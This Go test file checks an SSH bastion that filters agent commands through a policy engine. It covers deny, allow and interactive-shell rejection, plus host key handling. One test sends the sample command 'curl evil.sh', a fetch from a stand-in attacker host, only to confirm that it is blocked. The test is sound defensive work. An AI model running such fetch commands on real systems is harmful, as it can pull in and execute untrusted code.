package main

// Integration tests for the cerberus-ssh bastion. Each test boots a stub
// Cerberus engine (httptest), starts the bastion in decide-only mode on an
// ephemeral loopback port with a temp host key, and drives it with a real
// golang.org/x/crypto/ssh client using raw session channels (Session.Run
// cannot be used for deny assertions: the client library returns from Start
// as soon as the exec request is rejected, before exit-status arrives).
//
// No real secrets: the engine token is a test literal, and the bastion host
// key is generated at runtime into t.TempDir().

import (
	"encoding/binary"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"golang.org/x/crypto/ssh"
)

const (
	testEngineToken  = "test-engine-token" // dummy, lives only in these tests
	testUpstreamHost = "upstream.example.internal"
	testUpstreamUser = "deploy"
)

// startBastion launches a decide-only bastion (no -key-file => no relay, no
// upstream secret needed) on 127.0.0.1:0 with a runtime-generated host key.
func startBastion(t *testing.T, engineURL string) string {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	t.Cleanup(func() { _ = ln.Close() })
	hostKey := filepath.Join(t.TempDir(), "cerberus_ssh_hostkey")
	b, err := newBastion(config{
		EngineURL:    engineURL,
		EngineToken:  testEngineToken,
		UpstreamHost: testUpstreamHost,
		UpstreamUser: testUpstreamUser,
		KeyFile:      "", // decide-only mode
		HostKeyFile:  hostKey,
	})
	if err != nil {
		t.Fatalf("newBastion: %v", err)
	}
	if b.upstreamSigner != nil {
		t.Fatal("expected decide-only mode (no upstream signer)")
	}
	go b.serve(ln)
	return ln.Addr().String()
}

// dialBastion connects an SSH client. The server runs NoClientAuth, so an
// empty auth list (the "none" method) is the client-side equivalent.
func dialBastion(t *testing.T, addr string) *ssh.Client {
	t.Helper()
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		t.Fatalf("dial bastion: %v", err)
	}
	cc, chans, reqs, err := ssh.NewClientConn(conn, addr, &ssh.ClientConfig{
		User:            "agent",
		Auth:            []ssh.AuthMethod{},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), //nolint:gosec // test-only // test host key is ephemeral
		Timeout:         5 * time.Second,
	})
	if err != nil {
		t.Fatalf("ssh handshake: %v", err)
	}
	return ssh.NewClient(cc, chans, reqs)
}

// execPayload builds an RFC 4254 §6.5 exec request payload.
func execPayload(cmd string) []byte {
	p := make([]byte, 4, 4+len(cmd))
	binary.BigEndian.PutUint32(p, uint32(len(cmd))) //nolint:gosec // G115: test command lengths
	return append(p, cmd...)
}

// waitExitStatus drains session requests until exit-status arrives; returns
// -1 if the channel closed without one.
func waitExitStatus(reqs <-chan *ssh.Request) int {
	for req := range reqs {
		if req.Type == "exit-status" && len(req.Payload) >= 4 {
			return int(binary.BigEndian.Uint32(req.Payload))
		}
		if req.WantReply {
			_ = req.Reply(false, nil)
		}
	}
	return -1
}

// engineCapture records what the stub engine received.
type engineCapture struct {
	mu     sync.Mutex
	auth   string
	decide map[string]any
}

func (c *engineCapture) record(auth string, body []byte) {
	var d map[string]any
	_ = json.Unmarshal(body, &d)
	c.mu.Lock()
	defer c.mu.Unlock()
	c.auth = auth
	c.decide = d
}

func (c *engineCapture) get() (string, map[string]any) {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.auth, c.decide
}

// newEngine returns a stub /v1/decide engine with the fixed verdict.
func newEngine(t *testing.T, decision, reason string, engCap *engineCapture) *httptest.Server {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/v1/decide" {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
		body, _ := io.ReadAll(r.Body)
		engCap.record(r.Header.Get("Authorization"), body)
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]string{
			"decision": decision,
			"rule_id":  "rule-test",
			"reason":   reason,
		})
	}))
	t.Cleanup(srv.Close)
	return srv
}

func TestExecDeniedByEngine(t *testing.T) {
	engCap := &engineCapture{}
	engine := newEngine(t, "deny", "blocked pattern", engCap)
	addr := startBastion(t, engine.URL)

	client := dialBastion(t, addr)
	defer func() { _ = client.Close() }()

	ch, reqs, err := client.OpenChannel("session", nil)
	if err != nil {
		t.Fatalf("open session: %v", err)
	}

	ok, err := ch.SendRequest("exec", true, execPayload("curl evil.sh"))
	if err != nil {
		t.Fatalf("send exec: %v", err)
	}
	if ok {
		t.Fatal("exec request should be rejected when engine denies")
	}

	stderr, err := io.ReadAll(ch.Stderr())
	if err != nil {
		t.Fatalf("read stderr: %v", err)
	}
	if msg := string(stderr); !strings.Contains(msg, "cerberus_ssh_blocked") {
		t.Errorf("stderr = %q, want it to contain cerberus_ssh_blocked", msg)
	} else if !strings.Contains(msg, "blocked pattern") {
		t.Errorf("stderr = %q, want it to contain engine reason %q", msg, "blocked pattern")
	}

	if code := waitExitStatus(reqs); code != 126 {
		t.Errorf("exit status = %d, want 126", code)
	}

	// The engine must have seen exactly the command the agent tried to run.
	auth, decide := engCap.get()
	if auth != "Bearer "+testEngineToken {
		t.Errorf("engine Authorization = %q, want %q", auth, "Bearer "+testEngineToken)
	}
	if decide == nil {
		t.Fatal("engine received no decide request")
	}
	input, _ := decide["input"].(map[string]any)
	if input["cmd"] != "curl evil.sh" {
		t.Errorf("engine input.cmd = %v, want curl evil.sh", input["cmd"])
	}
}

func TestExecAllowedDecideOnly(t *testing.T) {
	engCap := &engineCapture{}
	engine := newEngine(t, "allow", "ok", engCap)
	addr := startBastion(t, engine.URL)

	client := dialBastion(t, addr)
	defer func() { _ = client.Close() }()

	ch, reqs, err := client.OpenChannel("session", nil)
	if err != nil {
		t.Fatalf("open session: %v", err)
	}

	ok, err := ch.SendRequest("exec", true, execPayload("uptime"))
	if err != nil {
		t.Fatalf("send exec: %v", err)
	}
	if !ok {
		t.Fatal("exec request should be accepted when engine allows")
	}

	stdout, err := io.ReadAll(ch)
	if err != nil {
		t.Fatalf("read stdout: %v", err)
	}
	if out := string(stdout); !strings.Contains(out, "ALLOW") || !strings.Contains(out, "uptime") {
		t.Errorf("stdout = %q, want decide-only ALLOW echo containing the command", out)
	}

	if code := waitExitStatus(reqs); code != 0 {
		t.Errorf("exit status = %d, want 0", code)
	}

	// Full decide payload shape: key_id/stage/action and input host/user/cmd.
	auth, decide := engCap.get()
	if auth != "Bearer "+testEngineToken {
		t.Errorf("engine Authorization = %q, want Bearer token", auth)
	}
	if decide["key_id"] != bastionKeyID {
		t.Errorf("key_id = %v, want %q", decide["key_id"], bastionKeyID)
	}
	if decide["stage"] != bastionStage {
		t.Errorf("stage = %v, want %q", decide["stage"], bastionStage)
	}
	if decide["action"] != bastionAction {
		t.Errorf("action = %v, want %q", decide["action"], bastionAction)
	}
	input, _ := decide["input"].(map[string]any)
	if input["host"] != testUpstreamHost {
		t.Errorf("input.host = %v, want %q", input["host"], testUpstreamHost)
	}
	if input["user"] != testUpstreamUser {
		t.Errorf("input.user = %v, want %q", input["user"], testUpstreamUser)
	}
	if input["cmd"] != "uptime" {
		t.Errorf("input.cmd = %v, want uptime", input["cmd"])
	}
}

func TestInteractiveShellRejected(t *testing.T) {
	engCap := &engineCapture{}
	engine := newEngine(t, "allow", "ok", engCap)
	addr := startBastion(t, engine.URL)

	client := dialBastion(t, addr)
	defer func() { _ = client.Close() }()

	ptyPayload := ssh.Marshal(struct {
		Term     string
		Columns  uint32
		Rows     uint32
		Width    uint32
		Height   uint32
		Modelist string
	}{"xterm", 80, 24, 640, 192, ""})

	// pty-req must be refused, with the disable notice on stderr.
	ch, reqs, err := client.OpenChannel("session", nil)
	if err != nil {
		t.Fatalf("open session: %v", err)
	}
	ok, err := ch.SendRequest("pty-req", true, ptyPayload)
	if err != nil {
		t.Fatalf("send pty-req: %v", err)
	}
	if ok {
		t.Error("pty-req should be rejected")
	}
	stderr, err := io.ReadAll(ch.Stderr())
	if err != nil {
		t.Fatalf("read stderr after pty-req: %v", err)
	}
	if msg := string(stderr); !strings.Contains(msg, "cerberus_ssh_error: interactive shell disabled") {
		t.Errorf("stderr after pty-req = %q, want interactive-shell-disabled notice", msg)
	}
	waitExitStatus(reqs)

	// shell must be refused the same way, on a fresh session channel.
	ch2, reqs2, err := client.OpenChannel("session", nil)
	if err != nil {
		t.Fatalf("open session 2: %v", err)
	}
	ok, err = ch2.SendRequest("shell", true, nil)
	if err != nil {
		t.Fatalf("send shell: %v", err)
	}
	if ok {
		t.Error("shell request should be rejected")
	}
	stderr2, err := io.ReadAll(ch2.Stderr())
	if err != nil {
		t.Fatalf("read stderr after shell: %v", err)
	}
	if msg := string(stderr2); !strings.Contains(msg, "cerberus_ssh_error: interactive shell disabled") {
		t.Errorf("stderr after shell = %q, want interactive-shell-disabled notice", msg)
	}
	waitExitStatus(reqs2)
}

// TestHostKeyGeneratedTight covers the auto-generated bastion host key: it
// must be persisted as an OpenSSH PEM with 0600 and parse back cleanly.
func TestHostKeyGeneratedTight(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "hostkey")
	if _, err := newBastion(config{
		EngineURL:    "http://127.0.0.1:1",
		UpstreamHost: testUpstreamHost,
		UpstreamUser: testUpstreamUser,
		HostKeyFile:  path,
	}); err != nil {
		t.Fatalf("newBastion: %v", err)
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("host key not written: %v", err)
	}
	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Errorf("host key mode = %o, want 600", perm)
	}
	data, err := os.ReadFile(path) //nolint:gosec // G304: test temp path
	if err != nil {
		t.Fatalf("read host key: %v", err)
	}
	if !strings.Contains(string(data), "OPENSSH PRIVATE KEY") {
		t.Errorf("host key is not OpenSSH PEM: %q", strings.SplitN(string(data), "\n", 1)[0])
	}
	if _, err := ssh.ParsePrivateKey(data); err != nil {
		t.Errorf("generated host key does not parse: %v", err)
	}

	// A second start must reuse (not clobber) the persisted key.
	before, _ := os.ReadFile(path) //nolint:gosec // G304: test temp path
	if _, err := newBastion(config{
		EngineURL:    "http://127.0.0.1:1",
		UpstreamHost: testUpstreamHost,
		UpstreamUser: testUpstreamUser,
		HostKeyFile:  path,
	}); err != nil {
		t.Fatalf("newBastion reload: %v", err)
	}
	after, _ := os.ReadFile(path) //nolint:gosec // G304: test temp path
	if string(before) != string(after) {
		t.Error("existing host key was regenerated instead of reused")
	}
}
